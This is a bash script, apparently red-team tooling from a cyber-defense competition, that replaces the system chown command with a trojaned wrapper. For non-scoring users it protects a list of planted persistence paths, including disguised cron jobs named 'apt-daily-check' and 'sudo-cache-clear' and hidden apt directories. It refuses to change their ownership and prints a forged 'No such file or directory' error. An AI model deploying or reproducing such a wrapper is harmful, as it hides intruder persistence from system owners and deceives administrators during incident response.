#!/bin/bash
REAL_CHOWN="/bin/chown"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_CHOWN "$@" ;;
esac



PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

SAFE_ARGS=()
FLAGS=()
OWNER_SET=0
OWNER_ARG=""

for arg in "$@"; do
    case "$arg" in
        --reference=*|-R|-v|-c|-f|--silent|--quiet|--recursive|--verbose|--changes|--from=*)
            FLAGS+=("$arg") ;;
        -*)
            FLAGS+=("$arg") ;;
        *)
            if [ $OWNER_SET -eq 0 ]; then
                OWNER_ARG="$arg"
                OWNER_SET=1
            elif _is_protected "$arg"; then
                echo "chown: cannot access '$arg': No such file or directory" >&2
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ $OWNER_SET -eq 1 ] && [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    exec $REAL_CHOWN "${FLAGS[@]}" "$OWNER_ARG" "${SAFE_ARGS[@]}"
fi
exit 0
